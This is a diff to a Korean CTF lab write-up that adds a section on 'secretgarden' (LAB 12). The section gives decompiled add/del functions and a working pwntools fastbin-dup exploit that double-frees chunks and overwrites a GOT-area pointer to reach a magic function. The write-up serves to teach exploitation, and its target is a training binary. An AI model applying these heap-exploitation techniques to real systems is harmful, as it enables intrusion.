@@ -697,9 +697,131 @@ t.interactive()
 local flag! <- 윽
 ```
 
-흠 0 index를 다시 puts_got로 바꾸고 거기다 쓰려고 했는데 안되가지고 1번까지 덮었다.. 왜안되는진 잘 모르겠다 ㅠ
-
 unlink는 코드만 보고는 이해하기 힘들기 때문에 how2heap, lazenca 문서들을 보고 이해하시길 바랍니다!
 
-지속적으로 추가할 예정 !
+<br>
+
+# LAB 12
+
+```c
+int add()
+{
+  void *v0; // rsi
+  size_t size; // [rsp+0h] [rbp-20h]
+  void *s; // [rsp+8h] [rbp-18h]
+  void *buf; // [rsp+10h] [rbp-10h]
+  unsigned __int64 v5; // [rsp+18h] [rbp-8h]
+
+  v5 = __readfsqword(0x28u);
+  s = 0LL;
+  buf = 0LL;
+  LODWORD(size) = 0;
+  if ( (unsigned int)flowercount > 0x63 )
+    return puts("The garden is overflow");
+  s = malloc(0x28uLL);
+  memset(s, 0, 0x28uLL);
+  printf("Length of the name :", 0LL, size);
+  if ( (unsigned int)__isoc99_scanf("%u", &size) == -1 )
+    exit(-1);
+  buf = malloc((unsigned int)size);
+  if ( !buf )
+  {
+    puts("Alloca error !!");
+    exit(-1);
+  }
+  printf("The name of flower :", size);
+  v0 = buf;
+  read(0, buf, (unsigned int)size);
+  *((_QWORD *)s + 1) = buf;
+  printf("The color of the flower :", v0, size);
+  __isoc99_scanf("%23s", (char *)s + 16);
+  *(_DWORD *)s = 1;
+  for ( HIDWORD(size) = 0; HIDWORD(size) <= 0x63; ++HIDWORD(size) )
+  {
+    if ( !*(&flowerlist + HIDWORD(size)) )
+    {
+      *(&flowerlist + HIDWORD(size)) = s;
+      break;
+    }
+  }
+  ++flowercount;
+  return puts("Successful !");
+}
+```
+
+add() 임의로 size 지정이 가능! 구조체 안에 여러 멤버들이 있는데 딱히 상관없고 손포징으로 malloc,free 시켜보면 쉽게 index랑 fastbin을 확인할 수 있음!
+
+```c
+int del()
+{
+  int result; // eax
+  unsigned int v1; // [rsp+4h] [rbp-Ch]
+  unsigned __int64 v2; // [rsp+8h] [rbp-8h]
+
+  v2 = __readfsqword(0x28u);
+  if ( !flowercount )
+    return puts("No flower in the garden");
+  printf("Which flower do you want to remove from the garden:");
+  __isoc99_scanf("%d", &v1);
+  if ( v1 <= 0x63 && *(&flowerlist + v1) )
+  {
+    *(_DWORD *)*(&flowerlist + v1) = 0;
+    free(*((void **)*(&flowerlist + v1) + 1));
+    result = puts("Successful");
+  }
+  else
+  {
+    puts("Invalid choice");
+    result = 0;
+  }
+  return result;
+}
+```
+
+del() 맘껏 free 할 수 있다. 간단한 fastbin dup 공격이다.
+
+```python
+from pwn import * 
+
+t = process('./secretgarden')
+
+r = lambda w: t.recvuntil(str(w))
+s = lambda z: t.sendline(str(z))
+
+def a(a,b,c):
+	r(":")
+	s("1")
+	r(":")
+	s(str(a))
+	r(":")
+	s(str(b))
+	r(":")
+	s(str(c))
+
+def d(a):
+	r(":")
+	s("3")
+	r(":")
+	s(str(a))
+
+magic = 0x0000000000400c7b
+
+a(0x50,"a","b")
+a(0x50,"a","b")
+a(0x50,"a","b")
+
+d(0)
+d(1)
+d(0)
+
+a(0x50,p64(0x602020-38),"aaaa")
+a(0x50,"a","b")
+a(0x50,"a","b")
+a(0x50,"\x00"*6 + p64(magic)*3,"b")
+t.interactive()
+
+local flag!
+```
+
+<br>
 
